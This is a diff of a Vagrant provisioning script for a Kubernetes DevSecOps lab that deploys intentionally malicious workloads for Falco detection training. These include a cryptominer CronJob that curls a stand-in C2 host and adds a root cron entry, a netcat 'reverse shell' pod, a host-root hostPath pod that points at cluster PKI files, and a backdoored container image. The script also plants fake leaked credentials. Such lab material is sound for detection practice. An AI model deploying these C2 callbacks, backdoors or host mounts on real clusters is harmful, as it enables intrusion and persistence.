+          name: nginx-dev
+          namespace: dev
+          labels:
+            app: nginx-dev
+        spec:
+          replicas: 1
+          selector:
+            matchLabels:
+              app: nginx-dev
+          template:
+            metadata:
+              labels:
+                app: nginx-dev
+            spec:
+              containers:
+              - name: nginx
+                image: nginx:alpine
+                ports:
+                - containerPort: 80
+        ---
+        apiVersion: v1
+        kind: Service
+        metadata:
+          name: nginx-dev
+          namespace: dev
+        spec:
+          selector:
+            app: nginx-dev
+          ports:
+          - port: 80
+            targetPort: 80
+        ---
+        apiVersion: v1
+        kind: Secret
+        metadata:
+          name: db-credentials
+          namespace: dev
+        type: Opaque
+        data:
+          username: ZGJhZG1pbg==
+          password: U3VwZXJTZWNyZXRQYXNzMTIzIQ==
+          host: cG9zdGdyZXMtZGIuZXhhbXBsZS5jb20=
+        EOF
 
           echo "Deploying cryptominer cronjob..."
           cat <<EOF | kubectl apply -f - || true
----
-apiVersion: batch/v1
-kind: CronJob
-metadata:
-  name: crypto-miner
-  namespace: insecure
-  labels:
-    security-test: "true"
-    app: malicious
-spec:
-  schedule: "*/5 * * * *"
-  concurrencyPolicy: Forbid
-  jobTemplate:
-    spec:
-      template:
+        ---
+        apiVersion: batch/v1
+        kind: CronJob
         metadata:
+          name: crypto-miner
+          namespace: insecure
           labels:
-            app: crypto-miner
+            security-test: "true"
+            app: malicious
+        spec:
+          schedule: "*/5 * * * *"
+          concurrencyPolicy: Forbid
+          jobTemplate:
+            spec:
+              template:
+                metadata:
+                  labels:
+                    app: crypto-miner
+                spec:
+                  containers:
+                  - name: miner
+                    image: alpine:3.20
+                    command:
+                    - /bin/sh
+                    - -c
+                    - |
+                      echo "=========================================="
+                      echo "CRYPTOMINER DETECTED"
+                      echo "=========================================="
+                      echo "SIMULATED MALICIOUS ACTIVITY:"
+                      apk add --no-cache curl netcat-openbsd 2>/dev/null || true
+                      curl -sS --connect-timeout 2 http://malicious-c2.example.com/register || true
+                      curl -sS --connect-timeout 2 http://malicious-c2.example.com/payload.sh || true
+                      dd if=/dev/zero of=/dev/null bs=1M count=50 2>/dev/null || true
+                      echo "* * * * * /tmp/persist.sh" > /var/spool/cron/crontabs/root 2>/dev/null || true
+                      echo "=========================================="
+                      echo "FALCO DETECTION:"
+                      echo "- Program run with netcat"
+                      echo "- Program run with curl"
+                      echo "- Shell command execution in container"
+                      echo "=========================================="
+                    resources:
+                      limits:
+                        cpu: "500m"
+                        memory: "512Mi"
+                  restartPolicy: OnFailure
+        ---
+        apiVersion: v1
+        kind: Pod
+        metadata:
+          name: reverse-shell
+          namespace: insecure
+          labels:
+            security-test: "true"
         spec:
           containers:
-          - name: miner
+          - name: shell
             image: alpine:3.20
-            command:
-            - /bin/sh
-            - -c
+            command: ["/bin/sh", "-c"]
+            args:
             - |
               echo "=========================================="
-              echo "CRYPTOMINER DETECTED"
+              echo "REVERSE SHELL POD"
               echo "=========================================="
-              echo "SIMULATED MALICIOUS ACTIVITY:"
-              apk add --no-cache curl netcat-openbsd 2>/dev/null || true
-              curl -sS --connect-timeout 2 http://malicious-c2.example.com/register || true
-              curl -sS --connect-timeout 2 http://malicious-c2.example.com/payload.sh || true
-              dd if=/dev/zero of=/dev/null bs=1M count=50 2>/dev/null || true
-              echo "* * * * * /tmp/persist.sh" > /var/spool/cron/crontabs/root 2>/dev/null || true
-              echo "=========================================="
-              echo "FALCO DETECTION:"
-              echo "- Program run with netcat"
-              echo "- Program run with curl"
-              echo "- Shell command execution in container"
-              echo "=========================================="
-            resources:
-              limits:
-                cpu: "500m"
-                memory: "512Mi"
-          restartPolicy: OnFailure
----
-apiVersion: v1
-kind: Pod
-metadata:
-  name: reverse-shell
-  namespace: insecure
-  labels:
-    security-test: "true"
-spec:
-  containers:
-  - name: shell
-    image: alpine:3.20
-    command: ["/bin/sh", "-c"]
-    args:
-    - |
-      echo "=========================================="
-      echo "REVERSE SHELL POD"
-      echo "=========================================="
-      echo "ATTACK: Reverse shell to malicious C2"
-      apk add --no-cache netcat-openbsd 2>/dev/null || true
-      while true; do
-        echo "Connecting to C2..."
-        nc -zv malicious-c2.example.com 4444 2>&1 || true
-        sleep 60
-      done
-EOF
+              echo "ATTACK: Reverse shell to malicious C2"
+              apk add --no-cache netcat-openbsd 2>/dev/null || true
+              while true; do
+                echo "Connecting to C2..."
+                nc -zv malicious-c2.example.com 4444 2>&1 || true
+                sleep 60
+              done
+        EOF
 
           echo "Deploying hostpath exploitation pod..."
           cat <<EOF | kubectl apply -f - || true
----
-apiVersion: v1
-kind: Pod
-metadata:
-  name: hostpath-exploit
-  namespace: vulnerable
-  labels:
-    security-test: "true"
-spec:
-  containers:
-  - name: exploit
-    image: alpine:3.20
-    command: ["/bin/sh", "-c"]
-    args:
-    - |
-      echo "=========================================="
-      echo "HOSTPATH EXPLOITATION POD"
-      echo "=========================================="
-      echo ""
-      echo "ATTACK VECTORS:"
-      echo "1. Read host secrets: cat /host/etc/kubernetes/pki/*"
-      echo "2. Read logs: ls -la /host/var/log/"
-      echo "3. Write to host: echo 'backdoor' > /host/tmp/backdoor"
-      echo ""
-      echo "FALCO DETECTION:"
-      echo "- Read sensitive file untrusted"
-      echo "- Write below root directory"
-      echo ""
-      echo "=========================================="
-      while true; do sleep 60; done
-    volumeMounts:
-    - name: host-root
-      mountPath: /host
-    - name: etc-kubernetes
-      mountPath: /host/etc/kubernetes
-  volumes:
-  - name: host-root
-    hostPath:
-      path: /
-      type: Directory
-  - name: etc-kubernetes
-    hostPath:
-      path: /etc/kubernetes
-EOF
+        ---
+        apiVersion: v1
+        kind: Pod
+        metadata:
+          name: hostpath-exploit
+          namespace: vulnerable
+          labels:
+            security-test: "true"
+        spec:
+          containers:
+          - name: exploit
+            image: alpine:3.20
+            command: ["/bin/sh", "-c"]
+            args:
+            - |
+              echo "=========================================="
+              echo "HOSTPATH EXPLOITATION POD"
+              echo "=========================================="
+              echo ""
+              echo "ATTACK VECTORS:"
+              echo "1. Read host secrets: cat /host/etc/kubernetes/pki/*"
+              echo "2. Read logs: ls -la /host/var/log/"
+              echo "3. Write to host: echo 'backdoor' > /host/tmp/backdoor"
+              echo ""
+              echo "FALCO DETECTION:"
+              echo "- Read sensitive file untrusted"
+              echo "- Write below root directory"
+              echo ""
+              echo "=========================================="
+              while true; do sleep 60; done
+            volumeMounts:
+            - name: host-root
+              mountPath: /host
+            - name: etc-kubernetes
+              mountPath: /host/etc/kubernetes
+          volumes:
+          - name: host-root
+            hostPath:
+              path: /
+              type: Directory
+          - name: etc-kubernetes
+            hostPath:
+              path: /etc/kubernetes
+        EOF
 
           echo "Creating leaked secrets file..."
           cat > /vagrant/terraform.tfstate <<'EOF'
-{
-  "version": 4,
-  "terraform_version": "1.9.8",
-  "resources": [
-    {
-      "type": "aws_db_instance",
-      "name": "production_db",
-      "instances": [{
-        "attributes": {
-          "password": "P@ssw0rd2026!SuperSecret",
-          "username": "dbadmin",
-          "endpoint": "prod-postgres-db.cabcdefg.us-east-1.rds.amazonaws.com"
+        {
+          "version": 4,
+          "terraform_version": "1.9.8",
+          "resources": [
+            {
+              "type": "aws_db_instance",
+              "name": "production_db",
+              "instances": [{
+                "attributes": {
+                  "password": "P@ssw0rd2026!SuperSecret",
+                  "username": "dbadmin",
+                  "endpoint": "prod-postgres-db.cabcdefg.us-east-1.rds.amazonaws.com"
+                }
+              }]
+            },
+            {
+              "type": "aws_iam_access_key",
+              "name": "developer_key",
+              "instances": [{
+                "attributes": {
+                  "id": "AKIAIOSFODNN7EXAMPLE",
+                  "secret": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+                }
+              }]
+            }
+          ]
         }
-      }]
-    },
-    {
-      "type": "aws_iam_access_key",
-      "name": "developer_key",
-      "instances": [{
-        "attributes": {
-          "id": "AKIAIOSFODNN7EXAMPLE",
-          "secret": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
-        }
-      }]
-    }
-  ]
-}
-EOF
+        EOF
 
           cat > /vagrant/.env.production <<'EOF'
-# Production Environment Variables - LEAKED!
-DB_PASSWORD=P@ssw0rd2026!SuperSecret
-AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
-AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
-STRIPE_SECRET_KEY=sk_live_4eC39HqLyjWDarjtT1zdp7dc
-JWT_SECRET=super-secret-jwt-key-1234567890
-EOF
+        # Production Environment Variables - LEAKED!
+        DB_PASSWORD=P@ssw0rd2026!SuperSecret
+        AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
+        AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+        STRIPE_SECRET_KEY=sk_live_4eC39HqLyjWDarjtT1zdp7dc
+        JWT_SECRET=super-secret-jwt-key-1234567890
+        EOF
 
           echo "Building and pushing backdoored image to Harbor..."
           for i in $(seq 1 30); do
@@ -1997,38 +2186,38 @@ EOF
           done
 
           cat > /tmp/Dockerfile.backdoor <<'EOF'
-FROM alpine:3.20
-RUN apk add --no-cache bash curl netcat-openbsd
-WORKDIR /app
-RUN cat > /app/app.sh <<'EOS'
-#!/bin/bash
-echo "[$(date)] API Server Starting..."
-while true; do
-    echo "[$(date)] Health check: OK"
-    sleep 30
-done
-EOS
-RUN chmod +x /app/app.sh
-RUN cat > /app/backdoor.sh <<'EOS'
-#!/bin/bash
-while true; do
-    if [ "${BACKDOOR_ENABLED:-false}" = "true" ]; then
-        echo "[BACKDOOR] Activated - Connecting to ${BACKDOOR_HOST:-c2.example.com}:${BACKDOOR_PORT:-4444}"
-        nc -zv ${BACKDOOR_HOST:-c2.example.com} ${BACKDOOR_PORT:-4444} 2>&1 || true
-    fi
-    sleep 60
-done
-EOS
-RUN chmod +x /app/backdoor.sh
-RUN cat > /app/start.sh <<'EOS'
-#!/bin/bash
-nohup /app/app.sh > /app/app.log 2>&1 &
-nohup /app/backdoor.sh > /app/backdoor.log 2>&1 &
-tail -f /app/*.log
-EOS
-RUN chmod +x /app/start.sh
-CMD ["/app/start.sh"]
-EOF
+        FROM alpine:3.20
+        RUN apk add --no-cache bash curl netcat-openbsd
+        WORKDIR /app
+        RUN cat > /app/app.sh <<'EOS'
+        #!/bin/bash
+        echo "[$(date)] API Server Starting..."
+        while true; do
+            echo "[$(date)] Health check: OK"
+            sleep 30
+        done
+        EOS
+        RUN chmod +x /app/app.sh
+        RUN cat > /app/backdoor.sh <<'EOS'
+        #!/bin/bash
+        while true; do
+            if [ "${BACKDOOR_ENABLED:-false}" = "true" ]; then
+                echo "[BACKDOOR] Activated - Connecting to ${BACKDOOR_HOST:-c2.example.com}:${BACKDOOR_PORT:-4444}"
+                nc -zv ${BACKDOOR_HOST:-c2.example.com} ${BACKDOOR_PORT:-4444} 2>&1 || true
+            fi
+            sleep 60
+        done
+        EOS
+        RUN chmod +x /app/backdoor.sh
+        RUN cat > /app/start.sh <<'EOS'
+        #!/bin/bash
+        nohup /app/app.sh > /app/app.log 2>&1 &
+        nohup /app/backdoor.sh > /app/backdoor.log 2>&1 &
+        tail -f /app/*.log
+        EOS
+        RUN chmod +x /app/start.sh
+        CMD ["/app/start.sh"]
+        EOF
 
           if command -v docker >/dev/null 2>&1; then
             echo "${HARBOR_PASS}" | docker login "${MASTER_IP}:30001" -u admin --password-stdin 2>/dev/null || true
@@ -2088,7 +2277,6 @@ EOF
           WORKER_NAME="#{name}"
           TOKEN_FILE=/vagrant/.k3s_token
           CLUSTER_STATE=/vagrant/.cluster_state.json
-          KUBECONFIG_PATH=/vagrant/kubeconfig.yaml
 
           export PATH=$PATH:/usr/local/bin:/var/lib/rancher/k3s/bin
 
@@ -2110,18 +2298,18 @@ EOF
           modprobe overlay || true
           modprobe vxlan || true
           cat <<EOF >/etc/modules-load.d/k8s.conf
-overlay
-br_netfilter
-vxlan
-EOF
+        overlay
+        br_netfilter
+        vxlan
+        EOF
           echo br_netfilter | tee /etc/modules-load.d/br_netfilter.conf >/dev/null
           cat <<EOF >/etc/sysctl.d/99-kubernetes.conf
-net.bridge.bridge-nf-call-iptables=1
-net.bridge.bridge-nf-call-ip6tables=1
-net.ipv4.ip_forward=1
-net.ipv4.conf.all.rp_filter=0
-net.ipv4.conf.default.rp_filter=0
-EOF
+        net.bridge.bridge-nf-call-iptables=1
+        net.bridge.bridge-nf-call-ip6tables=1
+        net.ipv4.ip_forward=1
+        net.ipv4.conf.all.rp_filter=0
+        net.ipv4.conf.default.rp_filter=0
+        EOF
           sysctl --system
           apt-get install -y iptables arptables ebtables 2>/dev/null || true
           update-alternatives --set iptables /usr/sbin/iptables-legacy 2>/dev/null || true
@@ -2177,7 +2365,6 @@ EOF
           done
         SHELL
 
-      # ================= KIND LAB PROVISIONING =================
       when "kind"
         vm.vm.network "forwarded_port", guest: 6443, host: 26443, host_ip: "127.0.0.1"
 
@@ -2216,16 +2403,16 @@ EOF
 
           mkdir -p /opt/kind
           cat > /opt/kind/config.yaml <<'EOF'
-kind: Cluster
-apiVersion: kind.x-k8s.io/v1alpha4
-nodes:
-- role: control-plane
-- role: worker
-- role: worker
-networking:
-  apiServerAddress: "0.0.0.0"
-  apiServerPort: 6443
-EOF
+        kind: Cluster
+        apiVersion: kind.x-k8s.io/v1alpha4
+        nodes:
+        - role: control-plane
+        - role: worker
+        - role: worker
+        networking:
+          apiServerAddress: "0.0.0.0"
+          apiServerPort: 6443
+        EOF
 
           echo ""
           echo "Creating Kind cluster automatically..."
@@ -2238,18 +2425,18 @@ EOF
             mkdir -p /home/vagrant/.kube
             kind get kubeconfig --name lab > /home/vagrant/.kube/config
             chown -R vagrant:vagrant /home/vagrant/.kube
-            
+
             echo ""
             echo "Cluster status:"
             kubectl cluster-info
             kubectl get nodes
-            
+
             cat >> /home/vagrant/.bashrc <<'EOF'
-# Kind aliases
-alias kind-kill='kind delete cluster --name lab'
-alias kind-restart='kind delete cluster --name lab && kind create cluster --config /opt/kind/config.yaml --name lab'
-alias kind-status='kubectl get nodes && kubectl get pods -A'
-EOF
+        # Kind aliases
+        alias kind-kill='kind delete cluster --name lab'
+        alias kind-restart='kind delete cluster --name lab && kind create cluster --config /opt/kind/config.yaml --name lab'
+        alias kind-status='kubectl get nodes && kubectl get pods -A'
+        EOF
           else
             echo "ERROR: Kind cluster creation failed"
             exit 1
@@ -2266,7 +2453,6 @@ EOF
           echo "=========================================="
         SHELL
 
-      # ================= K3D LAB PROVISIONING =================
       when "k3d"
         vm.vm.network "forwarded_port", guest: 6443, host: 26444, host_ip: "127.0.0.1"
         vm.vm.network "forwarded_port", guest: 8080, host: 28080, host_ip: "127.0.0.1"
@@ -2310,25 +2496,25 @@ EOF
 
           mkdir -p /opt/k3d
           cat > /opt/k3d/config.yaml <<'EOF'
-apiVersion: k3d.io/v1alpha5
-kind: Simple
-metadata:
-  name: lab
-servers: 1
-agents: 2
-ports:
-  - port: 8080:80@loadbalancer
-  - port: 8443:443@loadbalancer
-options:
-  k3d:
-    wait: true
-    timeout: 60s
-  k3s:
-    extraArgs:
-      - arg: --disable=traefik
-        nodeFilters:
-          - server:*
-EOF
+        apiVersion: k3d.io/v1alpha5
+        kind: Simple
+        metadata:
+          name: lab
+        servers: 1
+        agents: 2
+        ports:
+          - port: 8080:80@loadbalancer
+          - port: 8443:443@loadbalancer
+        options:
+          k3d:
+            wait: true
+            timeout: 60s
+          k3s:
+            extraArgs:
+              - arg: --disable=traefik
+                nodeFilters:
+                  - server:*
+        EOF
 
           echo ""
           echo "Creating K3d cluster automatically..."
@@ -2341,18 +2527,18 @@ EOF
             mkdir -p /home/vagrant/.kube
             k3d kubeconfig get lab > /home/vagrant/.kube/config
             chown -R vagrant:vagrant /home/vagrant/.kube
-            
+
             echo ""
             echo "Cluster status:"
             kubectl cluster-info
             kubectl get nodes
-            
+
             cat >> /home/vagrant/.bashrc <<'EOF'
-# K3d aliases
-alias k3d-kill='k3d cluster delete lab'
-alias k3d-restart='k3d cluster delete lab && k3d cluster create lab --config /opt/k3d/config.yaml'
-alias k3d-status='kubectl get nodes && kubectl get pods -A'
-EOF
+        # K3d aliases
+        alias k3d-kill='k3d cluster delete lab'
+        alias k3d-restart='k3d cluster delete lab && k3d cluster create lab --config /opt/k3d/config.yaml'
+        alias k3d-status='kubectl get nodes && kubectl get pods -A'
+        EOF
           else
             echo "ERROR: K3d cluster creation failed"
             exit 1
@@ -2369,7 +2555,6 @@ EOF
           echo "=========================================="
         SHELL
 
-      # ================= CI/CD SERVER PROVISIONING =================
       when "cicd"
         vm.vm.network "forwarded_port", guest: GITEA_PORT, host: GITEA_PORT, host_ip: "127.0.0.1"
         vm.vm.network "forwarded_port", guest: JENKINS_PORT, host: JENKINS_HOST_PORT, host_ip: "127.0.0.1"
@@ -2386,9 +2571,9 @@ EOF
         vm.vm.provision "shell", inline: <<-SHELL
           set -euo pipefail
           export MASTER_IP="#{cfg[:ip]}"
-          export HARBOR_PASS=#{Shellwords.escape(HARBOR_PASS)}
+          export HARBOR_PASS=#{Shellwords.escape(harbor_pass)}
           export FAST_BOOT="#{FAST_BOOT}"
-          
+
           GITEA_VERSION="#{GITEA_VERSION}"
           JENKINS_VERSION="#{JENKINS_VERSION}"
           SONARQUBE_VERSION="#{SONARQUBE_VERSION}"
@@ -2396,7 +2581,7 @@ EOF
           ZAP_VERSION="#{ZAP_VERSION}"
           GITLEAKS_VERSION="#{GITLEAKS_VERSION}"
           TRIVY_VERSION="#{TRIVY_VERSION}"
-          
+
           GITEA_PORT="#{GITEA_PORT}"
           JENKINS_PORT="#{JENKINS_PORT}"
           SONARQUBE_PORT="#{SONARQUBE_PORT}"
@@ -2428,46 +2613,46 @@ EOF
           log "Installing Gitea ${GITEA_VERSION}..."
           mkdir -p /opt/gitea
           cat > /opt/gitea/docker-compose.yaml <<GITEA_EOF
-version: "3"
-services:
-  gitea:
-    image: gitea/gitea:${GITEA_VERSION}
-    container_name: gitea
-    environment:
-      - GITEA__database__DB_TYPE=postgres
-      - GITEA__database__HOST=db:5432
-      - GITEA__database__NAME=gitea
-      - GITEA__database__USER=gitea
-      - GITEA__database__PASSWD=gitea
-      - GITEA__server__DOMAIN=localhost
-      - GITEA__server__HTTP_PORT=${GITEA_PORT}
-      - GITEA__server__ROOT_URL=http://localhost:${GITEA_PORT}/
-    restart: always
-    volumes:
-      - ./data:/data
-      - ./conf:/etc/gitea
-    ports:
-      - "${GITEA_PORT}:${GITEA_PORT}"
-      - "2222:22"
-    depends_on:
-      - db
-    networks:
-      - cicd-net
-  db:
-    image: postgres:14
-    restart: always
-    environment:
-      - POSTGRES_USER=gitea
-      - POSTGRES_PASSWORD=gitea
-      - POSTGRES_DB=gitea
-    volumes:
-      - ./postgres:/var/lib/postgresql/data
-    networks:
-      - cicd-net
-networks:
-  cicd-net:
-    driver: bridge
-GITEA_EOF
+        version: "3"
+        services:
+          gitea:
+            image: gitea/gitea:${GITEA_VERSION}
+            container_name: gitea
+            environment:
+              - GITEA__database__DB_TYPE=postgres
+              - GITEA__database__HOST=db:5432
+              - GITEA__database__NAME=gitea
+              - GITEA__database__USER=gitea
+              - GITEA__database__PASSWD=gitea
+              - GITEA__server__DOMAIN=localhost
+              - GITEA__server__HTTP_PORT=${GITEA_PORT}
+              - GITEA__server__ROOT_URL=http://localhost:${GITEA_PORT}/
+            restart: always
+            volumes:
+              - ./data:/data
+              - ./conf:/etc/gitea
+            ports:
+              - "${GITEA_PORT}:${GITEA_PORT}"
+              - "2222:22"
+            depends_on:
+              - db
+            networks:
+              - cicd-net
+          db:
+            image: postgres:14
+            restart: always
+            environment:
+              - POSTGRES_USER=gitea
+              - POSTGRES_PASSWORD=gitea
+              - POSTGRES_DB=gitea
+            volumes:
+              - ./postgres:/var/lib/postgresql/data
+            networks:
+              - cicd-net
+        networks:
+          cicd-net:
+            driver: bridge
+        GITEA_EOF
 
           cd /opt/gitea
           /usr/local/bin/docker-compose up -d || echo "WARNING: Gitea failed to start"
@@ -2478,14 +2663,14 @@ GITEA_EOF
           log "Installing Jenkins ${JENKINS_VERSION}..."
           mkdir -p /opt/jenkins
           cat > /opt/jenkins/Dockerfile <<JENKINS_EOF
-FROM jenkins/jenkins:${JENKINS_VERSION}
-USER root
-RUN apt-get update && apt-get install -y curl git docker.io python3 python3-pip && \
-    apt-get clean && rm -rf /var/lib/apt/lists/*
-RUN curl -fsSL https://get.docker.com -o get-docker.sh && sh get-docker.sh
-RUN usermod -aG docker jenkins
-USER jenkins
-JENKINS_EOF
+        FROM jenkins/jenkins:${JENKINS_VERSION}
+        USER root
+        RUN apt-get update && apt-get install -y curl git docker.io python3 python3-pip && \\
+            apt-get clean && rm -rf /var/lib/apt/lists/*
+        RUN curl -fsSL https://get.docker.com -o get-docker.sh && sh get-docker.sh
+        RUN usermod -aG docker jenkins
+        USER jenkins
+        JENKINS_EOF
 
           cd /opt/jenkins
           docker build --build-arg JENKINS_VERSION=${JENKINS_VERSION} -t jenkins-lab . || echo "WARNING: Jenkins build failed"
@@ -2552,66 +2737,66 @@ JENKINS_EOF
           log "Creating sample Jenkins pipeline..."
           mkdir -p /opt/jenkins/pipelines
           cat > /opt/jenkins/pipelines/DevSecOps-Pipeline.groovy <<PIPELINE_EOF
-pipeline {
-    agent any
-    
-    environment {
-        HARBOR_URL = 'https://${MASTER_IP}:30001'
-        HARBOR_PROJECT = 'airgap'
-        SONAR_HOST_URL = 'http://localhost:${SONARQUBE_PORT}'
-        VAULT_ADDR = 'http://localhost:${VAULT_PORT}'
-        VAULT_TOKEN = 'root'
-    }
-    
-    stages {
-        stage('Checkout') {
-            steps {
-                git 'http://localhost:${GITEA_PORT}/user/repo.git'
+        pipeline {
+            agent any
+
+            environment {
+                HARBOR_URL = 'https://${MASTER_IP}:30001'
+                HARBOR_PROJECT = 'airgap'
+                SONAR_HOST_URL = 'http://localhost:${SONARQUBE_PORT}'
+                VAULT_ADDR = 'http://localhost:${VAULT_PORT}'
+                VAULT_TOKEN = 'root'
+            }
+
+            stages {
+                stage('Checkout') {
+                    steps {
+                        git 'http://localhost:${GITEA_PORT}/user/repo.git'
+                    }
+                }
+
+                stage('Secret Scanning - Gitleaks') {
+                    steps {
+                        sh 'gitleaks detect -r . -v || true'
+                    }
+                }
+
+                stage('Build') {
+                    steps {
+                        sh 'docker build -t app:\${BUILD_NUMBER} .'
+                    }
+                }
+
+                stage('Container Scanning - Trivy') {
+                    steps {
+                        sh 'trivy image app:\${BUILD_NUMBER} --exit-code 0 --severity HIGH,CRITICAL || true'
+                    }
+                }
+
+                stage('Push to Harbor') {
+                    steps {
+                        sh '''
+                            echo "${HARBOR_PASS}" | docker login ${MASTER_IP}:30001 -u admin --password-stdin
+                            docker tag app:\${BUILD_NUMBER} ${MASTER_IP}:30001/\${HARBOR_PROJECT}/app:\${BUILD_NUMBER}
+                            docker push ${MASTER_IP}:30001/\${HARBOR_PROJECT}/app:\${BUILD_NUMBER}
+                        '''
+                    }
+                }
+            }
+
+            post {
+                always {
+                    sh 'docker system prune -f'
+                }
+                success {
+                    echo 'Pipeline executed successfully!'
+                }
+                failure {
+                    echo 'Pipeline failed! Check logs for details.'
+                }
             }
         }
-        
-        stage('Secret Scanning - Gitleaks') {
-            steps {
-                sh 'gitleaks detect -r . -v || true'
-            }
-        }
-        
-        stage('Build') {
-            steps {
-                sh 'docker build -t app:\${BUILD_NUMBER} .'
-            }
-        }
-        
-        stage('Container Scanning - Trivy') {
-            steps {
-                sh 'trivy image app:\${BUILD_NUMBER} --exit-code 0 --severity HIGH,CRITICAL || true'
-            }
-        }
-        
-        stage('Push to Harbor') {
-            steps {
-                sh '''
-                    echo "${HARBOR_PASS}" | docker login ${MASTER_IP}:30001 -u admin --password-stdin
-                    docker tag app:\${BUILD_NUMBER} ${MASTER_IP}:30001/\${HARBOR_PROJECT}/app:\${BUILD_NUMBER}
-                    docker push ${MASTER_IP}:30001/\${HARBOR_PROJECT}/app:\${BUILD_NUMBER}
-                '''
-            }
-        }
-    }
-    
-    post {
-        always {
-            sh 'docker system prune -f'
-        }
-        success {
-            echo 'Pipeline executed successfully!'
-        }
-        failure {
-            echo 'Pipeline failed! Check logs for details.'
-        }
-    }
-}
-PIPELINE_EOF
+        PIPELINE_EOF
 
           # ============================================================
           # 8. CREATE SAMPLE APPLICATION
@@ -2619,57 +2804,57 @@ PIPELINE_EOF
           log "Creating sample application..."
           mkdir -p /opt/sample-app
           cat > /opt/sample-app/Dockerfile <<'APP_EOF'
-FROM python:3.9-slim
-WORKDIR /app
-COPY app.py .
-RUN pip install flask
-EXPOSE 5000
-CMD ["python", "app.py"]
-APP_EOF
+        FROM python:3.9-slim
+        WORKDIR /app
+        COPY app.py .
+        RUN pip install flask
+        EXPOSE 5000
+        CMD ["python", "app.py"]
+        APP_EOF
 
           cat > /opt/sample-app/app.py <<'APP_EOF'
-from flask import Flask
-import os
+        from flask import Flask
+        import os
 
-app = Flask(__name__)
+        app = Flask(__name__)
 
-@app.route('/')
-def hello():
-    return 'Hello from DevSecOps Pipeline!'
+        @app.route('/')
+        def hello():
+            return 'Hello from DevSecOps Pipeline!'
 
-@app.route('/health')
-def health():
-    return {'status': 'healthy'}
+        @app.route('/health')
+        def health():
+            return {'status': 'healthy'}
 
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
-APP_EOF
+        if __name__ == '__main__':
+            app.run(host='0.0.0.0', port=5000)
+        APP_EOF
 
           cat > /opt/sample-app/requirements.txt <<'APP_EOF'
-flask==2.2.3
-APP_EOF
+        flask==2.2.3
+        APP_EOF
 
           # ============================================================
           # 9. HARBOR PUSH SCRIPT
           # ============================================================
           log "Creating Harbor integration script..."
           cat > /usr/local/bin/harbor-push <<'HARBOR_EOF'
-#!/bin/bash
-if [ $# -lt 2 ]; then
-    echo "Usage: harbor-push <image-name> <tag>"
-    exit 1
-fi
+        #!/bin/bash
+        if [ $# -lt 2 ]; then
+            echo "Usage: harbor-push <image-name> <tag>"
+            exit 1
+        fi
 
-IMAGE_NAME="$1"
-TAG="$2"
-HARBOR_REGISTRY="${MASTER_IP}:30001"
-HARBOR_PROJECT="airgap"
+        IMAGE_NAME="$1"
+        TAG="$2"
+        HARBOR_REGISTRY="${MASTER_IP}:30001"
+        HARBOR_PROJECT="airgap"
 
-echo "Pushing ${IMAGE_NAME}:${TAG} to Harbor..."
-docker tag "${IMAGE_NAME}:${TAG}" "${HARBOR_REGISTRY}/${HARBOR_PROJECT}/${IMAGE_NAME}:${TAG}"
-docker push "${HARBOR_REGISTRY}/${HARBOR_PROJECT}/${IMAGE_NAME}:${TAG}"
-echo "Push complete!"
-HARBOR_EOF
+        echo "Pushing ${IMAGE_NAME}:${TAG} to Harbor..."
+        docker tag "${IMAGE_NAME}:${TAG}" "${HARBOR_REGISTRY}/${HARBOR_PROJECT}/${IMAGE_NAME}:${TAG}"
+        docker push "${HARBOR_REGISTRY}/${HARBOR_PROJECT}/${IMAGE_NAME}:${TAG}"
+        echo "Push complete!"
+        HARBOR_EOF
           chmod +x /usr/local/bin/harbor-push
 
           echo ""
